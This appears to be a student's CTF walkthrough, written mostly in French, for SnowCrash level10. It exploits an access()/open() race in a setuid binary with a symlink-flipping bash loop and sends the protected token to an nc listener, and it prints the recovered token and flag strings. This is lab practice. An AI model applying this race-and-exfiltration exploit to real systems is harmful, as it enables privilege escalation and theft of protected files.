ls -la
ex level10
token

level10@SnowCrash:~$ cat token
cat: token: Permission denied

level10@SnowCrash:~$ ./level10 token
./level10 file host
        sends file to host if you have access to it

level10@SnowCrash:~$ ./level10 token localhost
You don't have access to token

je cree un /tmp/test avec rien de dans et je me donne les droit puis je test
./level10 /tmp/test localhost
Connecting to localhost:6969 .. Unable to connect to host localhost

du coup ca marche avec un serveur je vais utiliser nc comme dans ft_irc pour resevoir les message

nc -lk 192.168.1.21 6969
puis je lance 
./level10 /tmp/test 192.168.1.21
il me renvoit ce que j'ai mis dans le /tmp/

bon je suis perdu je ltrace et je vois la fonction access qui check les permission
je cherche si on peut faire quelque chose avec et hop dans le man de access on nous dit
Avertissement : Utiliser access() pour vérifier si un utilisateur a le droit, par exemple, d'ouvrir un fichier avant d'effectuer réellement l'ouverture avec open(2), risque de créer un trou de sécurité. En effet, l'utilisateur peut exploiter le petit intervalle de temps entre la vérification et l'accès pour modifier le fichier (via un lien symbolique en général). Pour cette raison, l'utilisation de cet appel système devrait être évitée.

il faut donc exploiter ce trou de securite en creant un fichier avec les droits en utilisant aussi la technique de link
et en le faisant tres vite on va pouvoir exploiter cette faille

bon le faire a la main et impossible il faut cree un programme qui link token a notre fichier et qui link notre fichier cree a un nouveau fichier
et on spam ca tank qu'on ne l'arrete pas ca donne ca:

/tmp/scrip.sh = 
#!/bin/bash

echo HAAAAA > /tmp/HAAAA
(while :; do ln -sf ~/token /tmp/test; ln -sf /tmp/HAAAA /tmp/test; done)&
while :; do ~/level10 /tmp/test 192.168.1.21; done

nc -lk 192.168.1.21 6969 d'un coter
et ensuite ./level10 /tmp/scrip.sh 192.168.1.21

HAAAAA
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
HAAAAA
.*( )*.
HAAAAA
.*( )*.
HAAAAA
.*( )*.
HAAAAA
.*( )*.
woupa2yuojeeaaed06riuj63c

flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c